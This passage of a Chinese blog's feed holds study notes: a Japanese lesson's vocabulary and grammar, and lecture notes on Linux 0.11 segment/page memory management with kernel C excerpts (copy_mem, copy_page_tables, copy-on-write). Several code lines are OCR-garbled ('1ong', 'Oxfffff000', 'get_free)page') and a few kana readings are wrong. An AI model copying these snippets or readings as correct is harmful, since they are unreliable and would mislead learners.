class="keyword">unsigned</span> <span class="number">1</span>ong page，<span class="comment">//物理地址</span></span></span></span><br><span class="line"><span class="function"><span class="params">                       </span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function">                       </span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">unsigned</span> <span class="keyword">long</span> tmp，*page table;page_table=(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)((address&gt;&gt;<span class="number">20</span>)&amp;ffc);<span class="comment">//页目录项</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(*page table)&amp;<span class="number">1</span>)</span><br><span class="line">page_table=(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(Oxfffff000&amp;*page_table);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp=get_free_page();</span><br><span class="line">*page_table=tmpl7; page_table=(<span class="keyword">unsigned</span> <span class="number">1</span>ong*)tmp;&#125;</span><br><span class="line">page_table[(address&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0x3ff</span>]=pagel7; <span class="keyword">return</span> page;</span><br><span class="line">&#125;<span class="comment">//放入page_table上</span></span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>实现页面的换入,实现请求调页,无非就是中断处理(申请空闲也,读入需要页,建立映射),如果没有相关页,则进行中断处理.</p></li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://xwdidi.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="汇编语言" scheme="http://xwdidi.top/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
      <category term="内存" scheme="http://xwdidi.top/tags/%E5%86%85%E5%AD%98/"/>
    
  </entry>
  
  <entry>
    <title>アパート    第九课</title>
    <link href="http://xwdidi.top/2018/11/25/2018-11-25-%E6%97%A5%E8%AF%AD%E7%AC%AC%E4%B9%9D%E8%AF%BE/"/>
    <id>http://xwdidi.top/2018/11/25/2018-11-25-日语第九课/</id>
    <published>2018-11-24T16:00:00.000Z</published>
    <updated>2019-04-06T13:54:02.907Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>イ类<br>安い　やすい</p><p>高い　たかい</p><p>低い　ひくい    </p><p>近い    　ちかい</p><p>遠い    　とおい    </p><p>新しい　あたたしい</p><p>古い　ふるい</p><p>大きい　おおきい</p><p>小さい　ちいさい</p><p>多い        おおい<br>少ない　すくない</p><p>難しい　むずかしい</p><p>易しい　やさしい</p><p>美味しい　おいしい</p><p>かわいい　可愛い</p><p>いい　よい</p><p>二类</p><p>しずか　静か</p><p>賑やか　にぎやか</p><p>便利　べんり</p><p>不便　ふべん</p><p>上手　じょうず</p><p>下手　へた</p><p>立派　りっぱ</p><p>複雑　ふくざつ</p><p>必要　ひつよう</p><p>ゆうめい　有名</p><p>綺麗　きれい</p><p>探します　さがします</p><p>選びます　えらびます</p><p>見ます　みます</p><p>きめます　決めます</p><p>払いまし　はらいます</p><p>家賃　やちん</p><p>ふどうさん　不動産</p><p>不動産会社</p><p>手続き　てつづき</p><p>保証人　ほしょにん</p><p>くるま　車</p><p>敷金　しききん</p><p>いい\よい</p><p>いい　よっくないです</p><p>いい　よくありません</p><p>I类否定:</p><p>く　＋　ありません</p><p>く　＋　ないです</p><p>II类否定:</p><p>は。。＋ではありません</p><p>ｘｘｘｘ　よりA／ANです</p><p>…(主语)は…よりA／ANです　より是前面的名词表示基准</p><p>..より…がA/ANです</p><p>Q：。。と・・と　どちらがA/ANですか　と表示并列</p><p>A:。。のほうがA/ANです　</p><p>…に近いです</p><p>。。。（起点）から遠いです</p><p>どぞう</p><p>日当たり　向阳处</p><p>昨日　きのう</p><p>きょう    　今日</p><p>最後　さいご</p><p>てつづき　手続き</p><p>保証人　ほしょうにん</p><p>素晴らしい　すばらしい</p><p>お住まい　おすまい</p><p>　飾り　かざり</p><p>上品　じょうひん</p><p>センス　</p><p>いいえ　とんでもありません</p><p>アパート　</p><p>和室　わしつ</p><p>襖　ふすま</p><p>押入　おしいれ</p><p>玄関　げんかん</p><p>洋室　ようしつ</p><p>マンション    n(数量)l(起居室)d(客厅)k(厨房)</p><p>アパート　一层或两层 木制</p><p>紹介　しょうかい</p><p>ふろ　</p><p>建物　たてもの</p><p>食堂　しょくどう</p><p>は　衬托主语</p><p>が　    谓语</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="日语" scheme="http://xwdidi.top/categories/%E6%97%A5%E8%AF%AD/"/>
    
    
      <category term="日语" scheme="http://xwdidi.top/tags/%E6%97%A5%E8%AF%AD/"/>
    
      <category term="日本" scheme="http://xwdidi.top/tags/%E6%97%A5%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>内存管理      L23   段页结合的实际内存管理</title>
    <link href="http://xwdidi.top/2018/11/24/2018-11-24-L23%E6%AE%B5%E9%A1%B5%E7%BB%93%E5%90%88%E7%9A%84%E5%AE%9E%E9%99%85%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://xwdidi.top/2018/11/24/2018-11-24-L23段页结合的实际内存管理/</id>
    <published>2018-11-23T16:00:00.000Z</published>
    <updated>2019-04-06T13:53:47.804Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>操作系统分段分页管理内存.</p><p>用户程序分段管理.</p><p>物理内存采用分页机制有效利用内存.</p><h2 id="课程总结"><a href="#课程总结" class="headerlink" title="课程总结"></a>课程总结</h2><h3 id="如何结合在一起"><a href="#如何结合在一起" class="headerlink" title="如何结合在一起"></a>如何结合在一起</h3><h4 id="分段"><a href="#分段" class="headerlink" title="分段:"></a>分段:</h4><p>在虚拟内存中分区,割出区域;用户程序分段,然后建立映射关系.</p><h4 id="分页"><a href="#分页" class="headerlink" title="分页:"></a>分页:</h4><p>物理内存打散成固定大小的页,用户程序打散成页,映射到各个页上面.</p><h4 id="想法"><a href="#想法" class="headerlink" title="想法:"></a>想法:</h4><p>将分段后的内存分布与被打散成页的用户程序进行关联.</p><p>如何将二者进行等价呢.?</p><p>将虚拟内存中分好段的程序映射给分好页的物理内存上,应该可行.</p><p>内存即地址空间.割出一段地址,给用户程序中的段,再从虚拟(内存)地址空间上映射给物理内存页上.</p><p>虚拟内存是不能真正使用的.</p><h3 id="段、页同时存在：段面向用户-页面向硬件"><a href="#段、页同时存在：段面向用户-页面向硬件" class="headerlink" title="段、页同时存在：段面向用户/页面向硬件"></a>段、页同时存在：段面向用户/页面向硬件</h3><ol><li><p>虚拟内存上割出一个段存放应用程序(被隔离).然后操作系统将地址映射到物理内存上.</p><p><img src="https://i.loli.net/2018/11/23/5bf80f1a1829e.jpg" alt></p></li><li><p>隔离内存是为了让用户<strong>使用内存</strong>.</p><p>段页同时存在时的<strong>重定位</strong>(地址翻译).</p><ul><li><p>根据段表寻找基址,得到虚拟地址</p></li><li><p>操作系统根据页表得到页号和偏移地址形成物理地址.</p><p><img src="https://i.loli.net/2018/11/23/5bf8121d8754e.jpg" alt></p><p>例:<code>jmp 40</code></p><p>通过两层地址翻译到达物理地址. </p></li></ul><p>既支持了段,又支持了页.</p><p>做好实验6,实际的段页内存管理.</p><p>核心在于:逻辑地址-&gt;虚拟地址-&gt;物理地址.(两层映射).</p></li></ol><h3 id="一个实际的段、页式内存管理"><a href="#一个实际的段、页式内存管理" class="headerlink" title="一个实际的段、页式内存管理"></a>一个实际的段、页式内存管理</h3><p>内存管理核心就是内存分配，所以从程序放入内存、使用内存开始..</p><p>要给进程分配内存,</p><ul><li><p>分配段,建段表;分配页,建页表</p></li><li><p>进程带动内存使用的图谱</p></li><li><p>从进程<strong>fork</strong>中的内存分配开始,从到能使用内存结束</p><ul><li><p>如何载入内存呢?</p><p>将用户段和虚拟内存割出的区域进行关联,建立映射(段表). 分区适配算法.</p><p>再将这段区域割成小块,每块和物理页的页框关联在一起.</p><p>最终表现为数据的物理内存存放.</p></li><li><p>具体点:使用段表记录虚拟内存区域的记录,页表记录虚拟内存区域如何放到物理内存上.</p><p><img src="https://i.loli.net/2018/11/24/5bf911d550baa.jpg" alt></p></li></ul><p>例:<code>[300]</code>如何寻址呢.</p><p>查询段表得到<code>ds:300</code>,然后<code>0x000453000</code>查表得到页表和页框号,最后得到了<code>0x7300</code>. </p><ol><li>割一段区域</li><li>程序到虚拟内存中</li><li>物理内存寻找空闲页</li><li>建立页表,错判载入</li><li>能使用300地址</li></ol></li></ul><h4 id="1-从fork开始-分配虚存-建段表"><a href="#1-从fork开始-分配虚存-建段表" class="headerlink" title="1. 从fork开始 分配虚存,建段表"></a>1. 从fork开始 <strong>分配虚存,建段表</strong></h4><p>fork()-&gt;sys_fork-&gt;copy_process</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_process</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">long</span> ebp,..)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    copy_mem(nr,p);...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>copy_mem</code>解析</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_mem</span><span class="params">(<span class="keyword">int</span> nr,task_struct *p)</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> new_data_base; </span><br><span class="line">new_data_base=nr*<span class="number">0x4000000</span>;<span class="comment">//64M*nr (nr是代表第几个进程) 对虚拟内存的分割,割了64m,放入代码段数据段. ①</span></span><br><span class="line">    </span><br><span class="line">set_base(p-&gt;<span class="number">1</span>dt[<span class="number">1</span>],<span class="keyword">new</span> data base);<span class="comment">//设置基址,填写段表 ②</span></span><br><span class="line">    </span><br><span class="line">set_base(p-&gt;<span class="number">1</span>dt[<span class="number">2</span>],<span class="keyword">new</span> data base);<span class="comment">//进程切换 pcb指向的段表会跟着切换</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/24/5bf91ebfc60d3.jpg" alt></p><ul><li><p>代码段,数据段都是一个段.</p></li><li><p>每个进程占64M虚拟地址空间，<strong>互不重叠</strong></p></li></ul><h4 id="虚拟地址与物理内存进行映射"><a href="#虚拟地址与物理内存进行映射" class="headerlink" title="虚拟地址与物理内存进行映射."></a>虚拟地址与物理内存进行映射.</h4><p>虚拟地址不重叠,所以分成的页也不会重叠.所以能共用一套页表.(简化的方法)</p><h4 id="2-接下来做什么呢-分配内存-建段表"><a href="#2-接下来做什么呢-分配内存-建段表" class="headerlink" title="2. 接下来做什么呢 ,分配内存,建段表"></a>2. 接下来做什么呢 ,分配内存,建段表</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_mem</span><span class="params">(<span class="keyword">int</span> nr,task struct *p)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">unsigned</span> <span class="keyword">long</span> old_data_base; </span><br><span class="line">old_data_base=get_base(current-&gt;<span class="number">1</span>dt[<span class="number">2</span>]); </span><br><span class="line">    <span class="function">copy page <span class="title">tables</span><span class="params">(old_data_base,new_data_base,data_limit)</span></span>;<span class="comment">//赋值页表, 共用一套页表,根据虚拟地址进行页表的拷贝</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_page_tables</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> from,<span class="keyword">unsigned</span> <span class="keyword">long</span> to,<span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">from_dir =(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(from&gt;&gt;<span class="number">20</span>)&amp;<span class="number">0xffc</span>);<span class="comment">//右移20位,父进程的虚拟地址,原因看图</span></span><br><span class="line">    </span><br><span class="line">to_dir=(<span class="keyword">unsigned</span> <span class="number">1</span>ong*)(to&gt;&gt;<span class="number">20</span>)&amp;<span class="number">0xffc</span>);</span><br><span class="line">size=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size+Ox3fffff)&gt;&gt;<span class="number">22</span>;</span><br><span class="line"><span class="keyword">for</span>(;size--&gt;<span class="number">0</span>;from_dir++,to dir++)&#123;</span><br><span class="line">from_page_table=(OXfffff000&amp;*from_dir);</span><br><span class="line">to_page_table=get_free_page();</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/24/5bf924690ca5b.jpg" alt></p><p>为什么不右移22位呢,右移22位后乘以4,4是指针的大小.</p><h3 id="from-page-table-与to-page-table？"><a href="#from-page-table-与to-page-table？" class="headerlink" title="from_page_table 与to_page_table？"></a>from_page_table 与to_page_table？</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;size--&gt;<span class="number">0</span>;from_dir++,to_dir++)&#123;</span><br><span class="line">to_page_table=get_free)page();</span><br><span class="line">    *to_dir = ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)to_page_table) | <span class="number">7</span>;</span><br></pre></td></tr></table></figure><p>根据页框指针寻找真正的页框号.</p><p>to_dir是子进程的页目录.父进程的页目录已经指向分配好的内存.子进程要指向合适的内存页了,通过<code>get_free_page()</code>获得空闲内存页以便于分配.用的时候再建立映射,节约了内存空间.再将分配好的地址赋值给<code>to_dir</code>.</p><h5 id="get-free-page-解析"><a href="#get-free-page-解析" class="headerlink" title="get_free_page()解析"></a>get_free_page()解析<img src="https://i.loli.net/2018/11/24/5bf928141e063.jpg" alt></h5><h4 id="3-完成内存的拷贝"><a href="#3-完成内存的拷贝" class="headerlink" title="3. 完成内存的拷贝."></a>3. 完成内存的拷贝.</h4><p>父进程指向的地方,子进程也需要指向它.</p><p><img src="https://i.loli.net/2018/11/24/5bf929f90e7a0.jpg" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>（；nr--&gt;<span class="number">0</span>；from_page_table++，to_page_table++）&#123;</span><br><span class="line">this_page=*from_page_table;</span><br><span class="line">    this_page&amp;=~<span class="number">2</span>; <span class="comment">// 只读写时复制</span></span><br><span class="line">    </span><br><span class="line">    *to_page_table = this_page;</span><br><span class="line">    *from_page_table=this_page;</span><br><span class="line">this_page-=LOW_MEM; this_page &gt;&gt;=<span class="number">12</span>;</span><br><span class="line">mem_map[this_page]++;<span class="comment">//作+1标记,多者共用内存空间,一个进程释放-1,直到0占用内存才被释放 &#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-程序-虚拟内-物理内存的模样"><a href="#4-程序-虚拟内-物理内存的模样" class="headerlink" title="4. 程序 虚拟内+物理内存的模样"></a>4. 程序 虚拟内+物理内存的模样</h3><p><img src="https://i.loli.net/2018/11/24/5bf92ca5ca970.jpg" alt></p><p>进程1<code>fork()</code>后形成进程2.</p><h3 id="5-放完后-如何使用呢"><a href="#5-放完后-如何使用呢" class="headerlink" title="5. 放完后,如何使用呢"></a>5. 放完后,如何使用呢</h3><p>段(LDT)表和页表建立好后,执行指令时MMU自动计算.</p><p>以下是大概流程.<code>*p = 7</code></p><p><img src="https://i.loli.net/2018/11/24/5bf92e9f0bf81.jpg" alt></p><p>fork后的进程二,因为原p的地址被设为只读了,为了避免其影响进程1,则会修改页表,再次申请一片新的内存,形成新的映射关系.</p><blockquote><p>进程拉动了内存</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://xwdidi.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="汇编" scheme="http://xwdidi.top/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="内存" scheme="http://xwdidi.top/tags/%E5%86%85%E5%AD%98/"/>
    
  </entry>
  
</feed>
